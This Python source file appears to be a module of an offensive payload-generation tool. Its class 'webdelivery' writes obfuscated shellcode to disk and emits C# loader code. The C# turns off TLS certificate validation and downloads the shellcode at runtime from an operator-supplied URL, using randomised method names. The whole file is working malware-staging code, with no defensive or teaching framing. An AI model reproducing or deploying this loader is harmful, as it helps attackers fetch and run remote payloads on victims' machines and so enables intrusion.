import random
import string
import json
from utils.utils import *

class webdelivery:

    def __init__(self, shellcode, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.type = type(shellcode).__name__
        if self.type == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.type == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.type == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)


    def imports(self):
        return ['using System.Net;']

    def codeblock(self):

        if self.type == 'bytes':        
            return f"""
            public static byte[] {self.name}()
            {{
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                var obfuscated = (new WebClient()).DownloadData("{self.url}");
                return obfuscated;
            }}
"""
        elif self.type == 'str':
            return f"""
            public static String {self.name}()
            {{
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                var obfuscated = (new WebClient()).DownloadString("{self.url}");
                return obfuscated;
            }}
"""
        elif self.type == 'list':
            return f"""
            public static String[] {self.name}()
            {{
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                var obfuscated = (new WebClient()).DownloadString("{self.url}").Split(new char[] {{ '\\n' }});
                return obfuscated;
            }}
"""


    def compilerOptions(self):
        return []

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}()')
